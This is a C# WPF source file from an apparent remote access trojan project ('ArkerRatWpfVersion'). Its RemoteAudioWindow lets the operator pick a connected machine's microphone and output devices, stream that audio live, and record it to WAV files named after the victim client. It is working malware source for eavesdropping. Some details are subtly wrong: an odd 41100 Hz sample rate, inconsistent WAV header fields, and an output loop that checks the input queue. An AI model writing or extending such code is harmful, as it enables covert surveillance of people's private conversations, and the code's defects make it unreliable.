using Microsoft.Win32;
using NAudio.Wave;
using NAudio.Wave.SampleProviders;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Data.SqlTypes;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for RemoteAudioWindow.xaml
    /// </summary>
    public partial class RemoteAudioWindow : Window
    {
        public static RATHostSession clientSession { get; set; }
        public RemoteAudioWindow(RATHostSession session)
        {
            InitializeComponent();
            clientSession = session;
            audioLog.IsReadOnly = true;
            audioLog.Document.Blocks.Clear();
            audioLog.AppendText("OBS not chosing file saving path, will cause the program to create a new folder within the Arker folder\n\n");
            windowText.Content += " - " + clientSession.clientInfo[0];
            clientSession.SendData("§RemoteAudioStart§§RemoteAudioEnd§");
            
            OutputSoundDeviceList.Items.Add("none");
            InputSoundDeviceList.Items.Add("none");

            OutputSoundDeviceList.SelectedItem = OutputSoundDeviceList.Items[0];
            InputSoundDeviceList.SelectedItem = InputSoundDeviceList.Items[0];

            OutputSoundDeviceList.SelectionChanged += SendOutputDeviceChoice;
            InputSoundDeviceList.SelectionChanged += SendInputDeviceChoice;


            outVolume.Minimum= 0;
            outVolume.Maximum= 1;
            inVolume.Minimum = 0;
            inVolume.Maximum = 1;

            outVolume.Value = 1;
            inVolume.Value = 1;

            clientSession.remoteAudioWindowIsAlreadyOpen = true;

            GlobalVariables.byteSize = 262144;

            
        }

        bool close = false;
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (!close)
                e.Cancel = true;
        }

        public async void CloseWindow(object sender, RoutedEventArgs e)
        {
            await clientSession.SendData("§RemoteAudioStart§close§RemoteAudioEnd§");

            await Task.Delay(300);

            if (!clientSession.remoteDesktopWindowIsAlreadyOpen)
                GlobalVariables.byteSize = 1024;


            clientSession.remoteAudioWindowIsAlreadyOpen = false;
            close = true;

            receiveOAudio = false;
            receiveIAudio= false;


            try
            {
                Task.WaitAll(ReceiveIATask);
            }
            catch (Exception) { }

            try
            {
                Task.WaitAll(ReceiveOATask);

            }
            catch (Exception) { }


            

            Close();
        }

        private void MinimizeWindow(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void MaximizeWindow(object sender, RoutedEventArgs e)
        {

        }

        private void Window_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (e.LeftButton == System.Windows.Input.MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        Dictionary<string,string> friendlynameTodeviceId= new Dictionary<string,string>();
        public void AddODevices(string devices)
        {
            string[] tempArray = devices.Split(',');
            foreach (var device in tempArray)
            {
                string[] deviceInfo = device.Split('|');
                friendlynameTodeviceId.Add(deviceInfo[1], deviceInfo[0]);
                Application.Current.Dispatcher.InvokeAsync(() => OutputSoundDeviceList.Items.Add(deviceInfo[1]));
            }
        }

        public void AddIDevices(string devices)
        {
            string[] tempArray = devices.Split(',');
            foreach (var device in tempArray)
            {
                string[] deviceInfo = device.Split('|');
                friendlynameTodeviceId.Add(deviceInfo[1], deviceInfo[0]);
                Application.Current.Dispatcher.InvokeAsync(() => InputSoundDeviceList.Items.Add(deviceInfo[1]));
            }
        }

        private async void SendOutputDeviceChoice(object sender, SelectionChangedEventArgs e)
        {
            OutputSoundDeviceList.IsEnabled = false;
            await Task.Delay(100);

            receiveOAudio = false;

            if(ReceiveOATask!=null)
            Task.WaitAll(ReceiveOATask);

            ComboBox comboBox = (ComboBox)e.Source;
            string device = comboBox.SelectedItem.ToString();

            if(device == "none")
            {
                await clientSession.SendData("§RemoteAudioStart§§ODS§§RemoteAudioEnd§");
                audioLog.AppendText("Output-audio from client is set to none. No audio will be received\n\n");
            }
            else
            {
                receiveOAudio= true;
                ReceiveOATask = Task.Run(() => ReceiveDecodeAndPlayClientOutputAudio());

                await clientSession.SendData("§RemoteAudioStart§§ODS§" + friendlynameTodeviceId[device] + "§RemoteAudioEnd§");
                audioLog.AppendText("Receiving output-audio from client\n\n");
            }
            OutputSoundDeviceList.IsEnabled = true;


        }

        private async void SendInputDeviceChoice(object sender, SelectionChangedEventArgs e)
        {
            InputSoundDeviceList.IsEnabled = false;
            await Task.Delay(100);

            receiveIAudio = false;

            if(ReceiveIATask!= null)
            Task.WaitAll(ReceiveIATask);

            ComboBox comboBox = (ComboBox)e.Source;
            string device = comboBox.SelectedItem.ToString();

            if (device == "none")
            {
                await clientSession.SendData("§RemoteAudioStart§§IDS§§RemoteAudioEnd§");
                audioLog.AppendText("Input-audio from client is set to none. No audio will be received\n\n");
            }
            else
            {
                receiveIAudio = true;

                ReceiveIATask = Task.Run(() =>ReceiveDecodeAndPlayClientInputAudio());

                await clientSession.SendData("§RemoteAudioStart§§IDS§" + friendlynameTodeviceId[device] + "§RemoteAudioEnd§");
                audioLog.AppendText("Receiving input-audio from client\n\n");

            }

            InputSoundDeviceList.IsEnabled = true;

        }

        private ConcurrentQueue<string> oAudioQue = new ConcurrentQueue<string>();
        private ConcurrentQueue<string> iAudioQue = new ConcurrentQueue<string>();

        private BufferedWaveProvider cOWaveProvider = new BufferedWaveProvider(new WaveFormat(41100, 1));
        private BufferedWaveProvider cIWaveProvider = new BufferedWaveProvider(new WaveFormat(41100, 1));

       private bool receiveOAudio= false;
       private bool receiveIAudio = false;

        private Task ReceiveOATask;
        private Task ReceiveIATask;
        private async void ReceiveDecodeAndPlayClientInputAudio()
        {
            iAudioQue = new ConcurrentQueue<string>();
            cIWaveProvider.ClearBuffer();

            WaveOutEvent waveOutEvent = new WaveOutEvent();
            waveOutEvent.Init(cIWaveProvider);

            waveOutEvent.DeviceNumber = 0;

            waveOutEvent.Play();

            while (!clientSession.source.IsCancellationRequested && !close && receiveIAudio)
            {
                if (iAudioQue.Count > 10)
                {
                    iAudioQue = new ConcurrentQueue<string>();
                    cIWaveProvider.ClearBuffer();
                }

                await Application.Current.Dispatcher.InvokeAsync(() => waveOutEvent.Volume = Convert.ToSingle(inVolume.Value));

                string temp = string.Empty;
                if(iAudioQue.TryDequeue(out temp))
                {
                    byte[] soundData = Convert.FromBase64String(temp);


                    //If recording
                    if (record)
                    {
                        await audioInputMemoryStream.WriteAsync(soundData, 0, soundData.Length);
                    }

                    cIWaveProvider.AddSamples(soundData, 0, soundData.Length);

                }

                await Task.Delay(10);
            }
            waveOutEvent.Stop();
        }

        private async void ReceiveDecodeAndPlayClientOutputAudio()
        {
            oAudioQue = new ConcurrentQueue<string>();
            cOWaveProvider.ClearBuffer();

            WaveOutEvent waveOutEvent = new WaveOutEvent();
            waveOutEvent.Init(cOWaveProvider);

            waveOutEvent.DeviceNumber = 0;

            waveOutEvent.Play();
            while (!clientSession.source.IsCancellationRequested && !close && receiveOAudio)
            {
                if (iAudioQue.Count > 10)
                {
                    oAudioQue = new ConcurrentQueue<string>();
                    cOWaveProvider.ClearBuffer();
                }

                await Application.Current.Dispatcher.InvokeAsync(() => waveOutEvent.Volume = Convert.ToSingle(outVolume.Value));

                string temp = string.Empty;
                if (oAudioQue.TryDequeue(out temp))
                {
                    byte[] soundData = Convert.FromBase64String(temp);

                    //If recording
                    if (record)
                    {
                        await audioOutputMemoryStream.WriteAsync(soundData, 0, soundData.Length);
                    }

                    cOWaveProvider.AddSamples(soundData, 0, soundData.Length);

                    
                }

                await Task.Delay(10);
            }
            waveOutEvent.Stop();
        }

        public void EnqueAudioData(string data)
        {
            if (data.Contains("§OA§"))
            {
                data = data.Replace("§OA§", string.Empty);
                oAudioQue.Enqueue(data);
            }
            else if (data.Contains("§IA§"))
            {
                data = data.Replace("§IA§", string.Empty);
                iAudioQue.Enqueue(data);
            }
        }

        MemoryStream audioOutputMemoryStream = new MemoryStream();
        MemoryStream audioInputMemoryStream = new MemoryStream();

        bool record = false;
        private async void recordButton_Click(object sender, RoutedEventArgs e)
        {
            
                record = !record;

                if (record)
                {
                audioLog.AppendText("Started recording audio\n\n");

                recordButton.Content = "Stop recording";

                    await StartTimerAsync();
                }
                else
                {
                await Application.Current.Dispatcher.InvokeAsync(() =>
                {
                    audioLog.AppendText("Stoped recording audio, recording saved at:"+path+"\n\n");


                    recordButton.Content = "Start recording";
                    recordButton.IsEnabled = false;
                    SaveAudioRecording();
                });

            }

        }
        Timer timer;
        private async Task StartTimerAsync()
        {
             timer= new Timer(TimerElapsed, null, TimeSpan.FromMinutes(5), Timeout.InfiniteTimeSpan);
            await Task.Delay(Timeout.Infinite);
        }

        private void TimerElapsed(object state)
        {
            recordButton_Click(null, null);
        }

        string path = string.Empty;
        private void SaveAudioRecording()
        {
            timer.Dispose();
            if (string.IsNullOrEmpty(path))
            {
                path = Directory.GetCurrentDirectory() + "\\AudioRecordings_"+clientSession.clientInfo[0];
                Directory.CreateDirectory(path);
            }

            List<byte[]> audioChunks = new List<byte[]>();

            foreach (var stream in new MemoryStream[] { audioOutputMemoryStream, audioInputMemoryStream })
            {
                stream.Position = 0;
                if (stream != null && stream.Length > 0 && stream.Position < stream.Length)
                {
                    audioChunks.Add(stream.ToArray());
                }
            }

            string outputFilePath = System.IO.Path.Combine(path, "audio_recording" + Directory.EnumerateFiles(path).Count().ToString() + ".wav");

            using (var fileStream = new FileStream(outputFilePath, FileMode.Create))
            {
                // Write the WAV header
                WriteWavHeader(fileStream, audioChunks.Sum(chunk => chunk.Length));

                // Concatenate and write the audio data
                foreach (var chunk in audioChunks)
                {
                    fileStream.Write(chunk, 0, chunk.Length);
                }
            }

            recordButton.IsEnabled = true;
        }

        private void WriteWavHeader(Stream stream, int audioDataSize)
        {
            using (var writer = new BinaryWriter(stream, Encoding.UTF8, true))
            {
                writer.Write(Encoding.ASCII.GetBytes("RIFF"));
                writer.Write(audioDataSize + 36); // Total file size - 8 bytes
                writer.Write(Encoding.ASCII.GetBytes("WAVE"));
                writer.Write(Encoding.ASCII.GetBytes("fmt "));
                writer.Write(16); // Length of format data
                writer.Write((ushort)1); // PCM format
                writer.Write((ushort)1); // Not Stereo
                writer.Write(41100); // Sample rate
                writer.Write(82200); // Byte rate (Sample rate * Channels * BitsPerSample / 8)
                writer.Write((ushort)4); // Block align (Channels * BitsPerSample / 8)
                writer.Write((ushort)16); // Bits per sample
                writer.Write(Encoding.ASCII.GetBytes("data"));
                writer.Write(audioDataSize); // Size of audio data
            }
        }




        private void choseDirectory_Click(object sender, RoutedEventArgs e)
        {
            System.Windows.Forms.FolderBrowserDialog whereToSaveFile = new System.Windows.Forms.FolderBrowserDialog();

            whereToSaveFile.Description = "Select a folder to save the file";

            System.Windows.Forms.DialogResult result = whereToSaveFile.ShowDialog();

            if (result == System.Windows.Forms.DialogResult.OK)
            {
                path = whereToSaveFile.SelectedPath;
            }
        }
private class AudioRecorder
    {
        private MixingSampleProvider mixProvider;
        private List<byte[]> channel1Chunks;
        private List<byte[]> channel2Chunks;
        private WaveFormat waveFormat;

        public AudioRecorder(int sampleRate, int channels)
        {
            waveFormat = new WaveFormat(sampleRate, channels);
            mixProvider = new MixingSampleProvider(waveFormat);
            channel1Chunks = new List<byte[]>();
            channel2Chunks = new List<byte[]>();
        }

        public void AddChannel1Chunk(byte[] chunk)
        {
            channel1Chunks.Add(chunk);
        }

        public void AddChannel2Chunk(byte[] chunk)
        {
            channel2Chunks.Add(chunk);
        }

        public void SaveMixedAudio(string outputPath)
        {
            var channel1Stream = CreateStreamFromChunks(channel1Chunks);
            var channel2Stream = CreateStreamFromChunks(channel2Chunks);

            var channel1Provider = new RawSourceWaveStream(channel1Stream, waveFormat).ToSampleProvider();
            var channel2Provider = new RawSourceWaveStream(channel2Stream, waveFormat).ToSampleProvider();

            mixProvider.AddMixerInput(channel1Provider);
            mixProvider.AddMixerInput(channel2Provider);

            WaveFileWriter.CreateWaveFile(outputPath, mixProvider.ToWaveProvider());
            ClearAudioChunks();
        }

        private Stream CreateStreamFromChunks(List<byte[]> chunks)
        {
            var outputStream = new MemoryStream();
            foreach (var chunk in chunks)
            {
                outputStream.Write(chunk, 0, chunk.Length);
            }
            outputStream.Position = 0;
            return outputStream;
        }

        public void ClearAudioChunks()
        {
            channel1Chunks.Clear();
            channel2Chunks.Clear();
            mixProvider = new MixingSampleProvider(waveFormat);
        }
    }

        private void audioLog_TextChanged(object sender, TextChangedEventArgs e)
        {
            audioLog.ScrollToEnd();
        }
    }


}
